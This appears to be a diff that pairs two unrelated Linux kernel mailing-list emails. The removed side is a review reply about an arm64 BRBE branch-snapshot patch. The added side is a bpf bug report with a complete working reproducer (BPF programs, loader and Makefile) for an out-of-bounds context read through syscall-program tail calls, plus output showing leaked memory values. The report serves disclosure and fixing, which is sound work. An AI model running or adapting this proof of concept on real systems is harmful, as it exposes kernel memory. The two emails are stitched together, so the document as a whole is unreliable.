@@ -1,88 +1,95 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.221.43
-ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1795777022;
-	b=FIyLrkQMi875qO/k8OUX89GLdEP4Jj2yQdx8tesjavbS3dLRO0w1uc7F1wNj4vydQHHX
-	 03P4CjovwrtTdqf76pJLITE/f2qRVXVXtChfn/yz4xfbxrw9kauvd553tV5zJqBEkP8st
-	 flSXkuoVuuC1zpa8uZO/uuab0wlQ3+4Y/4jAhfhVCh3H9B7vQY3uKUfPhTLS8qkhUgARK
-	 H1TxnHhuyrR91S9U6pz806He5VrOR8QdaEm8p9SnFj16C+x6XHBYpbWPHy6/HdLd6Q9YM
-	 INxF9SelwMyAVhxI8sICRTL6XuN9bkX4WQvwE0fl62rtN2FbcRm/cyRazRhYWKLqcEw==
-ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1795777022;
+Authentication-Results: smtp.subspace.kernel.org; arc=pass header.oldest-pass=0 smtp.remote-ip=74.125.82.45
+ARC-Seal: i=2; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=pass;
+	t=1795777435;
+	b=v5xWI7jIzuxy/hbTd+O5ewUChVsnb2/K4ij7g1V7PTsrUCRoV3d7sIr5WqTvrMENkhOk
+	 ah4aLiCQ0Fj++3Tqj5yPTbcIYI7nSMUkOIhcBIYWaxhZ+LZgzVOUqMQOWF6dX6Js8WQQP
+	 rgtkkPSpDfFQ8F00LZIiMZv62tVEAoyfVnOo8RvZDrqC7Gi4wrj9HAK4GBtPyj1NysIb3
+	 keGFLezv3CKzK1c8/T656Ej17KaO8H6rki4T5nHnigDHExRBvirOdrB9GM86jWfL2GML5
+	 /YbxamR3JOY1FdoCdp+wBUanJbZd1kJC+nwgU/LgGaCkof3aCr8+CpW3yA2ZyVeXClw==
+ARC-Message-Signature: i=2; d=subspace.kernel.org; s=arc20261015;
+	a=rsa-sha256; c=relaxed/relaxed; t=1795777435;
 	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
-	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
-	 Message-ID:Date:MIME-Version:User-Agent:Subject:To:Cc:References:
-	 Content-Language:From:In-Reply-To:Content-Type:
-	 Content-Transfer-Encoding;
-	bh=SrR+taCSYKOy0V34lVNOUOBJDJI1/m+bArOv03O8lxI=;
-	b=oq0ADyJLQTJDDt1/sfBeOWgQNhQ/fmCsiA4Q4RDQaY7kUNG81hkrJeXFAF6QrsXY0Kwl
-	 FK1KAYZaxcLRYBuhwKUU/wW/TsH9l3a0zCfJeSdcz78FnMCF5rO3xrdy3xfTT5+ObMepu
-	 g8EiIxwp5RMiwybV+aX2TDa9ZEHMOEdmjNgHz6nIAXeCpMvMxCe5shVR7TuvNGYwWbziG
-	 WCA3qlOVfBA3o3ibw71aznqlmjcAFnFr4urrlc+39cTruaRcRha57Nb307AZuYqPjD0QU
-	 v1vBIwwBEboL/xdw2WLWYhuYReF7fbDripXTwMpSbmle+5Hi0IdNWCxto7FzX5UzgFA==
-ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
-	dmarc=pass header.from=linaro.org;
-	spf=pass smtp.mailfrom=linaro.org;
-	dkim=pass header.d=linaro.org header.i=@linaro.org header.a=rsa-sha256 header.s=google header.b=uKoUtz9e;
-	arc=none smtp.remote-ip=209.85.221.43
-Received: from mail-wr1-f43.google.com (mail-wr1-f43.google.com [209.85.221.43])
+	 X-Gm-Message-State:X-Gm-Gg:X-Received:MIME-Version:From:Date:
+	 X-Gm-Features:Message-ID:Subject:To:Content-Type;
+	bh=4Be8VXnaq3SJu2co7uqEZlqXTgzfcxmVLcZdxR9TIV0=;
+	b=RmgJmQOTycXHtg1YfIJzTXqQ5uZKs9aSa2zqUSb8TPJNrms1NKwJH9RS9CcfqsUfR4bO
+	 8gSITBN7D5gLF9/37kPVD9rl5RuPBBXx/05tIcBsNcDFMnCFToDuVDRA1qLx9lteQc1dv
+	 qy/dfEfSCffhwaa14zhbeTbO2b1vRpKYGixklN0TbhvCw+tVcf+JfZ9n+4my3j+TUaa2v
+	 lhdK/72n7R+809rB/CKotvyQBUoETJ24Wvn3yRnkAFDhFGI0fraK4zgCfQ+ypL9o4eN8g
+	 2NSOWrjB9cLcMleMCnQb+sND2tI7GaG+RPoTwTB+ed+V5BK1XgoN8Aa5LTYOeFgPMDg==
+ARC-Authentication-Results: i=2; smtp.subspace.kernel.org; 
+	dmarc=pass header.from=gmail.com;
+	spf=pass smtp.mailfrom=gmail.com;
+	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=u9n6OxsG;
+	arc=pass header.oldest-pass=0 smtp.remote-ip=74.125.82.45
+Received: from mail-dl1-f45.google.com (mail-dl1-f45.google.com [74.125.82.45])
 	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
 	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 99D36606A31F
-	for <bpf@vger.kernel.org>; Fri, 27 Nov 2026 10:57:01 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 99D36606A31F
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linaro.org
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=linaro.org
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id ECEB1606A32D
+	for <bpf@vger.kernel.org>; Fri, 27 Nov 2026 11:03:54 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org ECEB1606A32D
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=linaro.org header.i=@linaro.org header.a=rsa-sha256 header.s=google header.b=uKoUtz9e
-Received: by mail-wr1-f43.google.com with SMTP id ffacd0b85a97d-48e09aa5264so4657302f8f.2
-        for <bpf@vger.kernel.org>; Fri, 27 Nov 2026 02:57:01 -0800 (PST)
+	dkim=pass (2048-bit key, unprotected) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=u9n6OxsG
+Received: by mail-dl1-f45.google.com with SMTP id a92af1059eb24-1b546061d58so18479014c88.1
+        for <bpf@vger.kernel.org>; Fri, 27 Nov 2026 03:03:54 -0800 (PST)
+ARC-Seal: i=1; a=rsa-sha256; t=1795777434; cv=none;
+        d=google.com; s=arc-20260327;
+        b=kig57sfexD123EhSxQ9PusYb1ZujoIhcIt5LPvpodzOh0cd3jHr4kToz7Z02sIa+Nm
+         4QcU0R2bRfBFJ4fKPOtRpCJYnuwqBTsdj/eA8q0o+ercS9PTaCPOdjVFB0HZFEPBy5e0
+         8OZBS0ghFe8zSWNBIMIOGEpV5t3YdKq6HWHe9AhWs4gCTT6+cm6TST2xoYkAlyvHWPV4
+         957b+2mzpFoMYxvXuwHyrYTAIhr4pF85S9bkK6ADFNF2Z6d9VLQ29HzuNh4ZUXIIMoPn
+         y0s/wegFPL5Ll6cY2JBtiLMYAvXtrl2uR2tqlNROosVglgjri5shynhiqgZvnwki2GFk
+         wQIw==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
+        h=to:subject:message-id:date:from:mime-version:dkim-signature;
+        bh=4Be8VXnaq3SJu2co7uqEZlqXTgzfcxmVLcZdxR9TIV0=;
+        fh=EzXzCgbyZE43JYT8VpZvdMGfP04YCbq1jqk2hq2thO0=;
+        b=GuB63fTDPhuKYex5Fz+6HYU4It/L3uwXcbSqVUas9XtYC6LZQ+9z3k8ud3ojyVbEzn
+         y3TNElpk9/FYfk5WhzreTN57bnLvSuDheRej/tL/9414eZOEh4VD3tXpFbuFncJTE0Cd
+         yK3uitF8D1wzVvHZ6GyAu4bIrxF5r1NGftmMfXZFQJGgZYad4U9YRTYNFpVAfpOfvFwX
+         uqlQvpwXfGOTHWjuxkIBzjUnZOmkJl5E9+Ceb8fv4nMKgP5J1eEfYEu6ryo1YbPbl4t5
+         PONNQ9RB15WcGhBux+is3vpM/WrU+OKJid+e3YHBAedg8cxOFJ3hpYIqN9DhS0jEhSRB
+         t28A==;
+        darn=vger.kernel.org
+ARC-Authentication-Results: i=1; mx.google.com; arc=none
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=linaro.org; s=google; t=1795777020; x=1796381820; darn=vger.kernel.org;
-        h=content-transfer-encoding:content-type:in-reply-to:from
-         :content-language:references:cc:to:subject:user-agent:mime-version
-         :date:message-id:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=SrR+taCSYKOy0V34lVNOUOBJDJI1/m+bArOv03O8lxI=;
-        b=uKoUtz9exeCtT/J0MSQPWgKYzoqnghWgPHR6RZKb0OlBDMgOpv9wU7GcWOajaySaQB
-         3D+NEuj5+2gaKkr5zM8FsiR8swBbOluzol4gjepNpc7N2SehB3AxrNCf3g72md+7nw7z
-         SJdx159tA5ouvrWReL5wvUu0ihLsMnJsRiE3+PC7vk1Ln9iW/87tPDQCAc9SBdGoK8y6
-         tf6SnKemDvo2VJsXLGmZEkXEeD7st33nOYFUSMF4+/sGrOY1Ntl8tLH71ikp4pmJF7Vl
-         hVW8ehIz/zqQ8dlJHeSNB2JmMi0v76jYphOAqwMoP3Y5FX9ttIEnaIqsKrtU5oCX+oTo
-         j2kg==
+        d=gmail.com; s=20260707; t=1795777434; x=1796382234; darn=vger.kernel.org;
+        h=content-type:to:subject:message-id:date:from:mime-version:from:to
+         :cc:subject:date:message-id:reply-to:content-type;
+        bh=4Be8VXnaq3SJu2co7uqEZlqXTgzfcxmVLcZdxR9TIV0=;
+        b=u9n6OxsG1k3r9Ivy0OMJiUCP7bT9//f7i6t1VpCk6ydyEmhLStc6SK52Ms4YhAZzQB
+         5U69r4TVS6uOp2huxePaLT8/3aj7899LHrcpmVYdY+XSRVuHOYuCaumPSCEr+8rdOlHl
+         zY/r8R1EmtstZOXDO1c1JLsqfyajHkhKOlm5+ZN+O9/gDmAlhxmjWQbw1AeMWpV/IWfG
+         NNitZZ87Y+hsgZ773+05Ps5ktmHm5Mw1XlnvL2xVQ/10+dyLinZevE5tBFBCwuXaUwxR
+         bjN47R5TiyhXiVVYdfwjDy8elBo4skX3v0WVhzrnl7eOkEpBSVpPncd7WYtsVPz+UaOD
+         iuIA==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1795777020; x=1796381820;
-        h=content-transfer-encoding:content-type:in-reply-to:from
-         :content-language:references:cc:to:subject:user-agent:mime-version
-         :date:message-id:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
-         :message-id:reply-to:content-type;
-        bh=SrR+taCSYKOy0V34lVNOUOBJDJI1/m+bArOv03O8lxI=;
-        b=YuEkmn+hVYYbtU1lRXyHQyrFQyrOgorXQgneAz35SzMHBf9H8dnxQCZBkPHwzYiHT1
-         wlhEVPQxjYoVddm8n4HDwtBGyy8+dRXlpTkxE4KxPNqT3HYuAH1u43fX3PRhKUcjBeRK
-         5LiPLjuXWOLJxbPIqRC8GDMX9d22OrGPyScr1VNs6l2qUhAIk0q6nbpq0hAPcnKbAoWi
-         kxglo3H8shchmmEDPlsKymAQ8IS5O4nRTPDl7o2Pr91aRUtbkugrnxOnFHuSRXfj2H/o
-         fCIP2cBZKeDVlTy+yXaoBMuwzWU2wrfjF4syMpv0hbwbloaj6UfAQuTDxOJ28CXWa1Yv
-         j7Pg==
-X-Forwarded-Encrypted: i=1; AL+hErFxrHh5Dz8nBSUgdSjO8bVDp/Cz3ERMxg4QfZBAw7k4ov0bzm5fXBDEG376j+bADOtXZbY=@vger.kernel.org
-X-Gm-Message-State: APuU4Z9dVpZZpN0FoUkKTcTxMWP2kBrjxAXZwp7QurTj/xFTDYnII3CT
-	SjkNZziAfFj0VIk193f8bU06zKiRqu0lZDv3Rua9/TYcsN4Kp4sIwXNCnuEbtJxas9w=
-X-Gm-Gg: AZFdTZellGdIdIY15XQT7RMkYhkGI97I3B03IqC/e+OsBO1SgbtdqMuIYEY4UKxE9Nh
-	1tpdoLCCVQ6ljTlYizvUhK4eLIAQqIJwDAJInU2X+W0o7Cmx9KP2btyu9SNRYAZR+TKIx8LsBhJ
-	KIC1/TaC5dsruBAwVJSdN8NLs+IWr0bmfAmvNI+W8p1TOoUQVfTOhl+igEr5KfXXgp4EVYO5Vnz
-	Yy9qObOIIj61mky4TXtxsCqfwBG1uL31Y7YTgzRnnGWqYq/JRZQWrbXq2amUHaDUvNEaw5Y1jrY
-	ZMqm+hK3yoqgMgtyvTDzTVMB3BupNpWXU14kRKuBBwdePuEun1+vkQj8V5JJR+QCDihGOjt8EFp
-	FZQGSoQKa9ScoO1Q/69lJ4soH91SUEenDxd4SOymqsnNuZaIY2NX5hiF0tk/EiVAewMQr5VinB8
-	DNgIu23FFe7127BlEWB7nl+YIKTR9rdV7KTfwwvrBUMW6q33ZEcM0lCkXQPb3AwmLGXp2F3FGMB
-	R31EvY8QULQPrMibrbaPcFdl7MRT+nyp5fAnGss/d7Zlvpt58qIQZXNCWRtLTzn6ubu2T7724u3
-	Ptp2zAdbOg1OTmaxSn0tD29ySeq8qcl6hA==
-X-Received: by 2002:a05:6000:2309:b0:4a7:45a2:ec26 with SMTP id ffacd0b85a97d-4abb0f3bc89mr49275277f8f.16.1795777020031;
-        Fri, 27 Nov 2026 02:57:00 -0800 (PST)
-Received: from [192.168.1.3] ([37.18.141.193])
-        by smtp.gmail.com with ESMTPSA id ffacd0b85a97d-4ab65cb4341sm46346149f8f.4.2026.11.27.02.56.58
-        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
-        Fri, 27 Nov 2026 02:56:59 -0800 (PST)
-Message-ID: <167b3016-4881-4ef4-9c1c-100ba96b50bd@linaro.org>
-Date: Fri, 27 Nov 2026 10:56:58 +0000
+        d=1e100.net; s=20260707; t=1795777434; x=1796382234;
+        h=content-type:to:subject:message-id:date:from:mime-version:x-gm-gg
+         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
+         :content-type;
+        bh=4Be8VXnaq3SJu2co7uqEZlqXTgzfcxmVLcZdxR9TIV0=;
+        b=FCOwxdr6xPujwLzYV5lEcUS+nUDcnc7FanCKWbPobzdZdnafdxVvKRT4QhyVlVbepG
+         ADGNhJRx7sYgTOnFgU31EXgcxwThOYZoix7P4JGX8m3iNxbg2QOR5zD7KmJeibdfKkxh
+         PyTpWd4PPvFQgtQjDPLAbMNPoq9MSrC+uaWIGLJMtrqHKR5/vJqEDvTPeSjGhcRCzeR6
+         NyEr1VMMEYccjqwfjtwC9jR9/8bhZiW99pvgfQxu6Yoxkk3fx9jNj4DvP7npA4HzWHQ1
+         +lT1dF47VdW3ttG3wvSxYsQxlFFjgoTbws6gHqEAp2ZoCbTFOz14/1OnP0MSM10QgXpi
+         YiDg==
+X-Gm-Message-State: APuU4Z8iwvvQ/qRF5dLESScIL6KzKLYR5o4hXpEikOiq4oO195X1c3RL
+	fa1yOx2XiL8RKeB0aqd5j183qb1yyHE7igEkO/EsG5jsxstVEGKsgqwlZ5C4/8MJ4bxF2IWtXVz
+	XDNJA+Q4gXfBdYiICw0XtsiJUa+LFxqKJ6U6igdl/GnzH
+X-Gm-Gg: AZFdTZdPdpCWiAgecqEcRApxeFmQyTH323bR9sLC5zHXG8VSu1R7cqtqBnd0/Ma9x60
+	UV7T4p3kaOZapfO3feayYyJl0k5/dGzleYoydnEcNddM3sKgi0DrjHlBVecxRxtrL0gW7GWhAlF
+	JQNwx17Y8KVgw5+YW74RgpF/r0/8fUhsIMxClOEZ6b408n1rpjrK5r6UClTPDFqBL/rGIgAT1Px
+	F7Yf+zWVx4kD0QCJBop7PnQ9G13VuLzNg+zUCdn1d/W4TCOO6PSncXyG6zxXsSLxg0LgPPt3vrq
+	7rOdSrmPJO5sN0z/4I97Gqj/O1gd0xHFpFxL3FhCypt9LNU4tdmI35YdqfvhEYLNUky/ICTlczd
+	+QB78YYle5PgZW+tLnhp+IhvyJ/w4GOxEJ3waASc=
+X-Received: by 2002:a05:701b:428a:20b0:1b5:1a0d:b544 with SMTP id
+ a92af1059eb24-1b5568a145bmr25834569c88.7.1795777433663; Fri, 27 Nov 2026
+ 03:03:53 -0800 (PST)
 X-Mailing-List: bpf@vger.kernel.org
 List-Id: <bpf.vger.kernel.org>
 List-Post: <mailto:bpf@vger.kernel.org>
@@ -92,118 +99,132 @@ List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
 List-Owner: <mailto:bpf+owner@vger.kernel.org>
 Precedence: list
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: [PATCH v6 2/3] perf/arm64: Add BRBE support for
- bpf_get_branch_snapshot()
-To: Leo Yan <leo.yan@arm.com>, Puranjay Mohan <puranjay@kernel.org>
-Cc: Catalin Marinas <catalin.marinas@arm.com>, Will Deacon <will@kernel.org>,
- Mark Rutland <mark.rutland@arm.com>, bpf@vger.kernel.org,
- Anshuman Khandual <anshuman.khandual@arm.com>,
- Puranjay Mohan <puranjay12@gmail.com>, Alexei Starovoitov <ast@kernel.org>,
- Daniel Borkmann <daniel@iogearbox.net>,
- John Fastabend <john.fastabend@gmail.com>,
- Andrii Nakryiko <andrii@kernel.org>, Martin KaFai Lau
- <martin.lau@linux.dev>, Eduard Zingerman <eddyz87@gmail.com>,
- Song Liu <song@kernel.org>, Yonghong Song <yonghong.song@linux.dev>,
- Rob Herring <robh@kernel.org>, Peter Zijlstra <peterz@infradead.org>,
- Ingo Molnar <mingo@redhat.com>, Arnaldo Carvalho de Melo <acme@kernel.org>,
- Namhyung Kim <namhyung@kernel.org>, Ian Rogers <irogers@google.com>,
- Adrian Hunter <adrian.hunter@intel.com>, Shuah Khan <shuah@kernel.org>,
- Breno Leitao <leitao@debian.org>, Ravi Bangoria <ravi.bangoria@amd.com>,
- Stephane Eranian <eranian@google.com>,
- Kumar Kartikeya Dwivedi <memxor@gmail.com>, Usama Arif
- <usama.arif@linux.dev>, linux-arm-kernel@lists.infradead.org,
- linux-perf-users@vger.kernel.org, linux-kselftest@vger.kernel.org,
- linux-kernel@vger.kernel.org, kernel-team@meta.com
-References: <20260810164622.1829843-1-puranjay@kernel.org>
- <20260810164622.1829843-3-puranjay@kernel.org>
- <20261126171904.GA809232@e132581.arm.com>
-Content-Language: en-US
-From: James Clark <james.clark@linaro.org>
-In-Reply-To: <20261126171904.GA809232@e132581.arm.com>
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 7bit
+From: ZNV <mejedi@gmail.com>
+Date: Fri, 27 Nov 2026 14:03:40 +0300
+X-Gm-Features: Aa3M54rXVy_lxET-Jghtvn0pONWmIyVu3gzJlsfMgOf4WY932yKa0ZePHJ06U7U
+Message-ID: <CAAYXoE8ORWnqLVofqZf2AxUvnV_Bd1Gsqb3qdJv+dCM2bVkvAg@mail.gmail.com>
+Subject: out of bounds context access with syscall programs + tail calls
+To: bpf <bpf@vger.kernel.org>
+Content-Type: text/plain; charset="UTF-8"
 
+Hi!
 
+Verifier computes prog->aux->max_ctx_access, a buffer passed to
+sys_bpf(PROG_RUN) must be at least that big (see
+bpf_prog_test_run_syscall).
 
-On 26/11/2026 17:19, Leo Yan wrote:
-> On Mon, Aug 10, 2026 at 09:46:19AM -0700, Puranjay Mohan wrote:
-> 
-> [...]
-> 
->> +int brbe_snapshot_branch_stack(struct perf_branch_entry *entries, unsigned int cnt)
->> +{
->> +	u64 brbidr, brbfcr, brbcr, pmcr;
->> +	int nr_hw, nr_copied = 0;
->> +	bool paused_here = false;
->> +	unsigned long flags;
->> +
->> +	/* Called with migration disabled, so this is the CPU read below. */
->> +	if (!valid_brbe_version())
->> +		return 0;
->> +
->> +	flags = raw_local_daif_save();
->> +
->> +	brbcr = read_sysreg_s(SYS_BRBCR_EL1);
->> +	brbfcr = read_sysreg_s(SYS_BRBFCR_EL1);
->> +
->> +	/*
->> +	 * PAUSED is only ever set behind our back, so finding it set is final.
->> +	 * likely() keeps this inline; a taken branch costs a record.
->> +	 */
->> +	if (likely(brbcr && !(brbfcr & BRBFCR_EL1_PAUSED))) {
->> +		/*
->> +		 * Stop the counters so a freeze cannot set PAUSED behind the
->> +		 * value read below; the D19.3 conditions need a PMOVSCLR_EL0
->> +		 * bit, which a stopped counter cannot set.
->> +		 */
->> +		pmcr = read_pmcr();
->> +		write_pmcr(pmcr & ~ARMV8_PMU_PMCR_E);
->> +		isb();
->> +
->> +		brbfcr = read_sysreg_s(SYS_BRBFCR_EL1);
->> +		paused_here = !(brbfcr & BRBFCR_EL1_PAUSED);
->> +
->> +		write_sysreg_s(brbfcr | BRBFCR_EL1_PAUSED, SYS_BRBFCR_EL1);
->> +		isb();
->> +	}
-> 
-> AI pointed out a edge case:
-> 
->   1) The PMU is enabled (PMCR_EL0.E=1). The first BRBFCR_EL1 read
->      observes PAUSED=0.
->   2) A counter overflows and hardware freezes BRBE before the helper
->      stops the counters. This can happen while interrupt is masked.
->   3) The helper saves PMCR_EL0 and clears PMCR_E. Its second BRBFCR_EL1
->      read observes PAUSED=1, so paused_here becomes false.
->   4) The only write restoring the saved PMCR_EL0 is inside
->      "if (paused_here)". The helper therefore returns with PMCR_EL0.E=0.
-> 
-> This can happen with a normal PMU IRQ because hardware can freeze BRBE
-> while local IRQs are masked.
-> 
+As far as I can tell, tail call map only enforces that the caller/callee
+program types are compatible, ignoring max_ctx_access. It is possible to
+chain 2 syscall programs via tail calls; the second one having a larger
+max_ctx_access (reproducer follows).
 
-Nice catch. This can be fixed by adding 'pmcr_saved' in addition to 
-'paused_here'. So 'pmcr_saved' would always always be set if the 
-likely-not-paused branch is true, and then 'paused_here' is still set 
-from the second read of BRBFCR.
+I hope that the fix won't be banning bpf_tail_call in syscall programs.
+It should be possible to augment compatibility check done by
+bpf_prog_map_compatible. Apparently struct bpf_map_owner has an
+alignment gap between .sleepable and .storage_cookie[] that is large
+enough to host the 16 bit max_ctx_access.
 
-Then on exit they are both treated separately. 'paused_here' invalidates 
-and unpauses again but 'pmcr_saved' can control restoring PMCR.
+Reproducer follows. User space invokes syscall1, which in turn
+tail-calls syscall2. Syscall2 loads and returns an __u32 at ctx+8192.
+Since syscall1 doesn't access ctx at all, sys_bpf(PROG_RUN) permits any
+context size. User space invokes syscall1 with different context sizes
+and prints the returned value. Size varies to make it less likely for
+the context buffer to end up at the same address in subsequent calls,
+making syscall2 sample different locations.
 
->> +	trace_hardirqs_off();
-> 
-> The irqsoff tracer misses the time between raw_local_daif_save() and
-> this call. Other callers could introduce similar gaps by using the raw
-> helper.
-> 
-> I'll reply separately on the pNMI / NMI cases with an approach that
-> may avoid adding the raw helpers.
+Example output:
 
-And that other approach also avoids having to disable the PMU counters 
-so avoids the edge case above.
+0
+0
+ff2950a3
+ff2950a3
+492f3000
+492f3000
+7bb8
+7bb8
+0
+0
+0
+0
+0
+0
+0
 
-> 
-> Thanks,
-> Leo
+k.c:
+#include <linux/bpf.h>
+#include <bpf/bpf_helpers.h>
 
+SEC("syscall")
+int syscall2(void *ctx)
+{
+    bpf_printk("syscall2");
+    return 2048[(int *)ctx];
+}
+
+struct {
+    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
+    __uint(max_entries, 1);
+    __uint(key_size, sizeof(__u32));
+    __uint(value_size, sizeof(__u32));
+    __array(values, int (void *));
+} prog_array SEC(".maps") = {
+    .values = {
+        [0] = &syscall2,
+    },
+};
+
+SEC("syscall")
+int syscall1(void *ctx)
+{
+    bpf_printk("syscall1");
+    bpf_tail_call(ctx, &prog_array, 0);
+    return 0;
+}
+
+char LICENSE[] SEC("license") = "GPL";
+
+syscall-oob.c:
+#include <stdio.h>
+#include <unistd.h>
+#include <bpf/bpf.h>
+#include <bpf/libbpf.h>
+#include "k.skel.h"
+
+int main(void)
+{
+    struct k *k = k__open_and_load();
+    if (!k) {
+        perror("k__open_and_load");
+        return 1;
+    }
+
+    int fd = bpf_program__fd(k->progs.syscall1);
+    int buf[256];
+    LIBBPF_OPTS(bpf_test_run_opts, opts, .ctx_in = buf);
+
+    for (int i = 1; i < 16; i++) {
+        // do different size classes to avoid sampling the same location
+        opts.ctx_size_in = i * 16;
+        int rc = bpf_prog_test_run_opts(fd, &opts);
+        if (rc != 0) {
+            perror("bpf_prog_test_run_opts");
+        } else {
+            printf("%x\n", opts.retval);
+        }
+    }
+
+    return 0;
+}
+
+Makefile:
+syscall-oob: syscall-oob.c k.skel.h
+    clang -o syscall-oob syscall-oob.c -lbpf
+k.skel.h: k.o
+    bpftool gen skeleton k.o > k.skel.h
+k.o: k.c
+    clang -g -O2 -c -target bpf k.c -isystem
+/usr/include/aarch64-linux-gnu/ -isystem
+/usr/include/x86_64-linux-gnu/
+.PHONY:clean
+clean:
+    rm -f syscall-oob k.o k.skel.h
